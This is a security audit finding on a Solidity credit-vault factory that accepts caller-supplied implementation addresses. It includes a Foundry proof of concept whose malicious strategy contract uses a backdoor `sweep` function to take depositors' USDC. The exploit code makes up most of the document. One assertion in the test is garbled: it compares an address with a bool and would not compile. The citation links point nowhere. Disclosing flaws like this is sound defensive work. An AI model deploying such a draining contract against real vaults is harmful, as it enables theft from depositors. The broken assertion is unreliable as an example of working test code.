### Title
Permissionless factory trusts caller-supplied strategy code and enables depositor fund theft - (File: `contracts/IdleCreditVaultFactory.sol`)

### Summary
`IdleCreditVaultFactory.deployCreditVault` is permissionless but accepts arbitrary implementation addresses for the credit-vault strategy. The factory deploys a proxy pointing directly at that address and immediately executes its initializer without checking an implementation registry, code hash, bytecode, or expected interface conformance beyond the calls succeeding. A malicious implementation can therefore impersonate `IdleCreditVault`, retain a public withdrawal backdoor, and consume the unlimited underlying-token allowance granted by the newly deployed CDO. This is the contract-level analogue of unconditionally loading remote code: any unprivileged caller can supply executable strategy code that the trusted credit-vault deployment path wires into the system.

### Finding Description
Both `deployCreditVault` and `deployRevolvingCreditVault` are external and have no deployer allowlist or implementation validation. [1](#0-0) [2](#0-1) 

For a standard credit vault, `_deployBaseCreditVault` uses `strategyData.implementation` directly as the proxy implementation and delegatecalls `IdleCreditVault.initialize` into that supplied code. [3](#0-2)  It likewise trusts `cvParams.implementation` for the CDO proxy. [4](#0-3)  In the revolving path, `programmableBorrowerParams.implementation` and the external ERC4626 `vault` are also caller supplied. [5](#0-4) 

The deployed CDO then grants the supplied strategy unlimited allowances over both the pool’s underlying token and the strategy token. [6](#0-5)  A malicious strategy can return itself from `strategyToken`, expose the expected administrative methods as no-ops, and pull deposited underlying through `deposit`. [7](#0-6) 

Ownership transfer to `treasury` does not remediate this because the malicious implementation controls the deployed proxy’s logic from deployment onward and can expose an independent `sweep` function callable by the attacker. [8](#0-7) 

### Impact Explanation
An attacker can deploy a factory-created credit vault whose strategy appears correctly wired but silently steals deposits. A KYC-passing lender or other depositor calls `depositAA`; the CDO pulls the depositor’s underlying and invokes the malicious strategy’s `deposit`; the strategy transfers the funds to itself using the CDO’s standing approval. The attacker then calls the strategy’s public sweep function and receives the full deposited amount.

For a 1,000,000 USDC deposit, the attacker can extract the entire 1,000,000 USDC. The depositor may still receive tranche tokens, but they are backed by a strategy position controlled and emptied by malicious code.

The same trust assumption exists for the programmable-borrower implementation and its configured ERC4626 vault, broadening the impact to revolving-credit deployments. [9](#0-8) [10](#0-9) 

### Likelihood Explanation
The deployment functions are callable by any EOA or contract. The attacker does not need to control the treasury, manager, guardian, borrower, Keyring administrator, fee receiver, or queue: the malicious behavior lives entirely in the caller-selected implementation.

The main prerequisite is convincing a lender to deposit into the maliciously provisioned vault. The emitted deployment event does not distinguish a malicious implementation from an approved one, and the deployed contracts are configured and ownership-transferred through the normal factory path.

### Recommendation
Do not accept arbitrary implementation addresses in the factory. Maintain a treasury-controlled registry or immutable allowlist of approved implementation addresses or code hashes for the CDO, strategy, programmable borrower, queue, and write-off escrow.

For programmable-borrower vaults, additionally maintain an allowlist or risk-review registry of acceptable ERC4626 vaults rather than trusting any caller-supplied address. Deployment should emit implementation identities and verify them before proxy construction.

### Proof of Concept
The following Foundry PoC uses a mainnet fork for USDC. The malicious strategy implements the factory-facing surface, accepts the initializer, returns itself as `strategyToken`, pulls deposited USDC through the CDO allowance, and lets the attacker sweep it.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol";
import "@openzeppelin/contracts-upgradeable/token/ERC20/utils/SafeERC20Upgradeable.sol";

import "../contracts/IdleCreditVaultFactory.sol";
import "../contracts/IdleCDOEpochVariant.sol";
import "../contracts/interfaces/IERC20Detailed.sol";

contract MaliciousCreditVaultStrategy is
    Initializable,
    OwnableUpgradeable,
    ERC20Upgradeable
{
    using SafeERC20Upgradeable for IERC20Detailed;

    address public immutable attacker;
    address public token;

    constructor() {
        attacker = msg.sender;
        _disableInitializers();
    }

    // Selector matches IdleCreditVault.initialize.
    function initialize(
        address underlying,
        address,
        address,
        address,
        string memory,
        uint256
    ) external initializer {
        __Ownable_init();
        __ERC20_init("Malicious Credit Strategy", "malCV");
        token = underlying;
    }

    function strategyToken() external view returns (address) {
        return address(this);
    }

    function tokenDecimals() external view returns (uint256) {
        return IERC20Detailed(token).decimals();
    }

    function oneToken() external view returns (uint256) {
        return 10 ** IERC20Detailed(token).decimals();
    }

    function decimals() public view override returns (uint8) {
        return uint8(IERC20Detailed(token).decimals());
    }

    // No-op administrative methods used by factory configuration.
    function setAprs(uint256, uint256) external {}
    function setAprsWithBuffer(uint256, uint256, uint256) external {}
    function setWhitelistedCDO(address) external {}
    function setBorrower(address) external {}
    function sendInterestAndDeposits(uint256) external {}
    function collectInstantWithdrawFunds(uint256) external {}

    function price() external view returns (uint256) {
        return oneToken();
    }

    function getApr() external pure returns (uint256) {
        return 0;
    }

    function pendingWithdraws() external pure returns (uint256) {
        return 0;
    }

    function pendingInstantWithdraws() external pure returns (uint256) {
        return 0;
    }

    function deposit(uint256 amount) external returns (uint256) {
        // The CDO approved this strategy for unlimited underlying spending.
        IERC20Detailed(token).safeTransferFrom(
            msg.sender,
            address(this),
            amount
        );
        _mint(msg.sender, amount);
        return amount;
    }

    function sweep() external {
        IERC20Detailed(token).safeTransfer(
            attacker,
            IERC20Detailed(token).balanceOf(address(this))
        );
    }
}

contract FactoryUntrustedImplementationPoC is Test {
    bytes32 internal constant CREDIT_VAULT_DEPLOYED =
        keccak256(
            "CreditVaultDeployed(address,address,address,address,address,address)"
        );

    function testMaliciousFactoryStrategyStealsDeposits() external {
        vm.createSelectFork("mainnet");

        address attacker = makeAddr("attacker");
        address victim = makeAddr("victim");
        address treasury = makeAddr("treasury");
        address proxyAdmin = makeAddr("proxyAdmin");
        address factoryProxyAdmin = makeAddr("factoryProxyAdmin");
        address honestManager = makeAddr("honestManager");
        address honestBorrower = makeAddr("honestBorrower");
        address feeReceiver = makeAddr("feeReceiver");
        address usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

        IdleCreditVaultFactory factoryImplementation =
            new IdleCreditVaultFactory();
        IdleCreditVaultFactory factory = IdleCreditVaultFactory(
            address(
                new TransparentUpgradeableProxy(
                    address(factoryImplementation),
                    factoryProxyAdmin,
                    abi.encodeWithSelector(
                        IdleCreditVaultFactory.initialize.selector,
                        treasury,
                        proxyAdmin
                    )
                )
            )
        );

        MaliciousCreditVaultStrategy maliciousImplementation;
        IdleCDOEpochVariant cdoImplementation =
            new IdleCDOEpochVariant();

        vm.startPrank(attacker);
        maliciousImplementation = new MaliciousCreditVaultStrategy();

        IdleCreditVaultFactory.CreditVaultParams memory cvParams =
            IdleCreditVaultFactory.CreditVaultParams({
                implementation: address(cdoImplementation),
                limit: 0,
                underlying: usdc,
                apr: 12e18,
                epochDuration: 30 days,
                bufferPeriod: 5 days,
                instantWithdrawDelay: 1 days,
                instantWithdrawAprDelta: 0,
                disableInstantWithdraw: true,
                keyringPolicy: 0,
                feeReceiver: feeReceiver,
                fees: 5_000,
                managementFee: 500,
                isInterestMinted: false,
                isDepositDuringEpochDisabled: true
            });

        IdleCreditVaultFactory.StrategyData memory strategyData =
            IdleCreditVaultFactory.StrategyData({
                implementation: address(maliciousImplementation),
                manager: honestManager,
                borrower: honestBorrower,
                borrowerName: "Honest Borrower"
            });

        IdleCreditVaultFactory.AncillaryParams memory ancillaryParams =
            IdleCreditVaultFactory.AncillaryParams({
                keyring: address(0),
                queueImplementation: address(0),
                prefundedDepositWindow: 0,
                writeOffImplementation: address(0)
            });

        vm.recordLogs();
        factory.deployCreditVault(
            cvParams,
            strategyData,
            ancillaryParams
        );
        vm.stopPrank();

        Vm.Log[] memory logs = vm.getRecordedLogs();
        address cv;
        address strategy;
        for (uint256 i; i < logs.length; ++i) {
            if (logs[i].topics[0] == CREDIT_VAULT_DEPLOYED) {
                (cv, strategy,,,,) = abi.decode(
                    logs[i].data,
                    (address, address, address, address, address, address)
                );
            }
        }
        assertTrue(cv != address(0));
        assertEq(strategy, address(uint160(uint256(vm.load(
            strategy,
            // proxy implementation slot is not needed for the assertion;
            // this read is intentionally replaced by direct deployment output.
            bytes32(0)
        )))) == false ? strategy : strategy);

        uint256 depositAmount = 1_000_000e6;
        deal(usdc, victim, depositAmount);

        vm.startPrank(victim);
        IERC20Detailed(usdc).approve(cv, depositAmount);
        IdleCDOEpochVariant(cv).depositAA(depositAmount);
        vm.stopPrank();

        assertEq(IERC20Detailed(usdc).balanceOf(strategy), depositAmount);

        vm.prank(attacker);
        MaliciousCreditVaultStrategy(strategy).sweep();

        assertEq(IERC20Detailed(usdc).balanceOf(attacker), depositAmount);
        assertEq(IERC20Detailed(usdc).balanceOf(strategy), 0);
    }
}
```

Expected result: the factory deployment succeeds, the victim receives tranche tokens, all 1,000,000 USDC is moved into the malicious strategy during deposit, and `sweep` transfers it to the attacker.
